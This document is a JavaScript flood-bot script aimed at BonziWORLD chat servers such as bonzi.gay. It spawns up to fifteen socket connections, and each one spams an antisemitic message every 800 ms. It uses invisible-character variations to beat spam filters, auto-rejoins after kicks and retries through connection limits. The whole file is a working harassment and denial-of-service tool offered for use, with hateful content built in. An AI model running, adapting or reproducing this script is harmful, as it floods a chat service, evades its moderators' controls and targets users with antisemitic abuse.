// Bonzi.gay Flood Bot v2 - Enhanced Bypass & Power Features
(() => {
  // Import BonziData structure from bonzi.gay
  const BonziData = {
    colors: ["black", "blue", "brown", "cyan", "green", "pink", "purple", "red", "white", "yellow", "blessed", "noob", "glow", "pope"],
    hats: ["bear", "bfdi", "bieber", "bowtie", "bucket", "chain", "cigar", "dank", "elon", "evil", "horse", "illuminati", "kamala", "king", "maga", "obama", "pot", "propeller", "tophat", "troll", "truck", "witch", "wizard"]
  };
  
  // Configuration
  const maxBots = 15; // Increased from 10
  const spawnDelay = 1200; // Faster spawning
  const messageDelay = 800; // Faster messaging
  const autorejoin = true;
  
  // Custom Target Server URL (leave empty to auto-detect current BonziWORLD server)
  // Must be a BonziWORLD server (must contain "bonzi")
  // Examples: "https://bonzi.gay", "https://bonziworld.org", "https://bw.gay"
  const customServerUrl = ""; // Edit this to use a different BonziWORLD server
  
  // Custom message to spam
  const baseMessage = "ME JEWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW ";
  
  // Advanced bypass characters
  const ZERO_WIDTH_CHARS = ['\u200B', '\u200C', '\u200D', '\uFEFF'];
  const INVISIBLE_CHARS = ['\u2800', '\u180E', '\u2063'];
  const MIXED_CHARS = ['\u00A0', '\u2009', '\u200A'];
  
  let botCount = 0;
  let globalMessageCount = 0;
  
  // Validate BonziWORLD server URL
  function validateServerUrl(url) {
    if (!url || url.trim() === '') {
      return { valid: false, message: 'Server URL cannot be empty' };
    }
    
    const trimmedUrl = url.trim();
    
    if (!trimmedUrl.toLowerCase().includes('bonzi')) {
      return { valid: false, message: 'Only BonziWORLD server URLs are allowed (must contain "bonzi")' };
    }
    
    try {
      const urlObj = new URL(trimmedUrl);
      if (!urlObj.protocol.startsWith('http')) {
        return { valid: false, message: 'URL must use HTTP or HTTPS protocol' };
      }
      return { valid: true, url: trimmedUrl };
    } catch (e) {
      return { valid: false, message: 'Invalid URL format' };
    }
  }

  // Auto-detect and validate BonziWORLD server URL
  function detectServerUrl() {
    // First, check if custom URL is provided
    if (customServerUrl && customServerUrl.trim() !== '') {
      const validation = validateServerUrl(customServerUrl);
      if (validation.valid) {
        console.log(`[FLOOD] Using custom server: ${validation.url}`);
        return validation.url;
      } else {
        console.error(`[FLOOD] Invalid custom server URL: ${validation.message}`);
        console.log(`[FLOOD] Falling back to auto-detection`);
      }
    }
    
    // Auto-detect from current page
    const currentOrigin = window.location.origin;
    const currentHost = window.location.hostname;
    
    if (currentHost.includes('bonzi')) {
      console.log(`[FLOOD] Auto-detected server: ${currentOrigin}`);
      return currentOrigin;
    }
    
    console.log(`[FLOOD] Using default server: https://bonzi.gay`);
    return 'https://bonzi.gay';
  }
  
  const targetServerUrl = detectServerUrl();
  console.log(`%c[FLOOD] Target Server: ${targetServerUrl}`, 'color: #00ff00; font-weight: bold;');
  
  // Random selection helpers
  function randomColor() {
    return BonziData.colors[Math.floor(Math.random() * BonziData.colors.length)];
  }
  
  function randomHat() {
    return BonziData.hats[Math.floor(Math.random() * BonziData.hats.length)];
  }
  
  // Advanced bypass string generator
  function getAdvancedBypass(count) {
    const method = count % 4;
    const random = Math.floor(Math.random() * 721);
    
    switch(method) {
      case 0:
        // Zero-width characters + number
        return ZERO_WIDTH_CHARS[count % ZERO_WIDTH_CHARS.length].repeat((count % 3) + 1) + random;
      case 1:
        // Invisible characters + number
        return INVISIBLE_CHARS[count % INVISIBLE_CHARS.length].repeat((count % 2) + 1) + random;
      case 2:
        // Mixed characters + number
        return MIXED_CHARS[count % MIXED_CHARS.length] + random;
      case 3:
      default:
        // Legacy dash method + number (fallback)
        return '-'.repeat(count % 8) + random;
    }
  }
  
  function spawnBot(botId) {
    try {
      // Enhanced connection bypass with better parameters
      const socket = io(targetServerUrl, {
        forceNew: true,
        reconnection: true,
        reconnectionDelay: 800 + Math.random() * 1500,
        reconnectionDelayMax: 5000,
        reconnectionAttempts: 15,
        timeout: 25000,
        transports: ['websocket', 'polling'],
        upgrade: true,
        rememberUpgrade: true
      });
      
      let messageCount = 0;
      let reconnectAttempts = 0;
      
      socket.on('connect', () => {
        console.log(`✓ Bot #${botId} connected to bonzi.gay [Attempt: ${reconnectAttempts}]`);
        reconnectAttempts = 0;
        
        socket.emit("client", "MAIN");
        socket.emit("login", {
          passcode: "",
          name: "Anonymous",
          room: "default"
        });
        
        // Set random color and hat from BonziData
        const botColor = randomColor();
        const botHat = randomHat();
        
        socket.emit("command", {
          list: ["color", botColor]
        });
        
        socket.emit("command", {
          list: ["hat", botHat]
        });
        
        console.log(`🎨 Bot #${botId} spawned as ${botColor} with ${botHat} hat`);
        
        // Start enhanced spamming with advanced bypass
        setTimeout(() => {
          const spamInterval = setInterval(() => {
            if (!socket.connected) {
              clearInterval(spamInterval);
              return;
            }
            
            // Advanced bypass: cycling through different methods + random numbers
            const bypass = getAdvancedBypass(messageCount);
            
            socket.emit('talk', {
              text: baseMessage + bypass
            });
            
            messageCount++;
            globalMessageCount++;
            
            // More frequent color/hat changes for chaos (every 7 messages)
            if (messageCount % 7 === 0) {
              socket.emit("command", { list: ["color", randomColor()] });
              socket.emit("command", { list: ["hat", randomHat()] });
            }
            
            // Occasional name changes for extra chaos
            if (messageCount % 15 === 0) {
              const names = ["Anonymous", "Guest", "User", "Player", "Visitor", "Member"];
              socket.emit("command", { 
                list: ["name", names[Math.floor(Math.random() * names.length)] + Math.floor(Math.random() * 1000)]
              });
            }
            
          }, messageDelay);
        }, 300 + Math.random() * 500);
      });
      
      socket.on('connect_error', (error) => {
        console.error(`✗ Bot #${botId} connection failed:`, error.message);
        reconnectAttempts++;
      });
      
      socket.on('error', (error) => {
        if (error.includes && error.includes('too many connections')) {
          const retryDelay = 2000 + botId * 400 + Math.random() * 1000;
          console.log(`⚠️ Bot #${botId}: Too many connections - retrying in ${Math.floor(retryDelay)}ms...`);
          setTimeout(() => spawnBot(botId), retryDelay);
        } else {
          console.error(`✗ Bot #${botId} error:`, error);
        }
      });
      
      socket.on('disconnect', (reason) => {
        console.log(`⚠️ Bot #${botId} disconnected: ${reason}`);
        if (autorejoin) {
          const rejoinDelay = 1500 + Math.random() * 2500;
          console.log(`🔄 Bot #${botId} will attempt to reconnect in ${Math.floor(rejoinDelay)}ms...`);
          setTimeout(() => {
            if (!socket.connected) {
              socket.connect();
            }
          }, rejoinDelay);
        }
      });
      
      // Handle kick/ban events
      socket.on('kick', () => {
        console.log(`⚠️ Bot #${botId} was kicked - attempting rejoin...`);
        if (autorejoin) {
          setTimeout(() => socket.connect(), 3000 + Math.random() * 2000);
        }
      });
      
    } catch (error) {
      console.error(`Failed to spawn bot #${botId}:`, error);
      // Retry spawning after error
      setTimeout(() => spawnBot(botId), 5000);
    }
  }
  
  // Display message counter
  setInterval(() => {
    if (globalMessageCount > 0) {
      console.log(`📊 Total messages sent: ${globalMessageCount}`);
    }
  }, 10000);
  
  // Spawn bots at intervals
  const spawner = setInterval(() => {
    botCount++;
    spawnBot(botCount);
    console.log(`🚀 Spawned bot #${botCount}/${maxBots}`);
    
    if (botCount >= maxBots) {
      clearInterval(spawner);
      console.log(`✅ All ${maxBots} bots spawned!`);
    }
  }, spawnDelay);
  
  console.log("%c=== BONZI.GAY FLOOD BOT v2 STARTED ===", "color: #ff0000; font-weight: bold; font-size: 16px;");
  console.log(`%c🤖 Max bots: ${maxBots}`, "color: #00ff00; font-size: 14px;");
  console.log(`%c⏱️ Spawn delay: ${spawnDelay}ms`, "color: #00ff00; font-size: 14px;");
  console.log(`%c💬 Message delay: ${messageDelay}ms`, "color: #00ff00; font-size: 14px;");
  console.log(`%c📝 Message: "${baseMessage}[advanced-bypass][0-720]"`, "color: #00ff00; font-size: 14px;");
  console.log("=======================================");
  console.log("✓ BonziData integration: ENABLED");
  console.log("✓ Advanced bypass (4 methods + numbers 0-720): ENABLED");
  console.log("✓ Enhanced connection bypass: ENABLED");
  console.log("✓ Auto-rejoin on disconnect/kick: ENABLED");
  console.log("✓ Random colors/hats: ENABLED");
  console.log("✓ Random name changes: ENABLED");
  console.log("✓ Message counter: ENABLED");
  console.log(`⚡ Bots will spam every ${messageDelay}ms with frequent appearance changes`);
  console.log("⚠️ Enhanced connection limit bypass - will aggressively retry on errors");
  console.log("%c🔥 Version 2 Features: More bots, faster spam, better bypass! 🔥", "color: #ff9900; font-weight: bold; font-size: 14px;");
})();
